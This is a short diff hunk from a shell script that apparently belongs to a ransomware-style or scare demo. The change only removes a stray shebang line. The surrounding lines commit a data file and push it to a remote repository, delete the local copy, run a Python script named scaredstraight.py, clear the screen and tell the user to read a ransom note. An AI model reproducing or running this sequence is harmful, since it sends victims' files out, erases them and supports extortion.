@@ -16,7 +16,6 @@ git add ./data.txt
 git commit -m "Uploaded data file"
 git push origin master
 rm ./data.txt
-#!/bin/bash
 python scaredstraight.py
 clear
 echo "READ RANSOM NOTE"
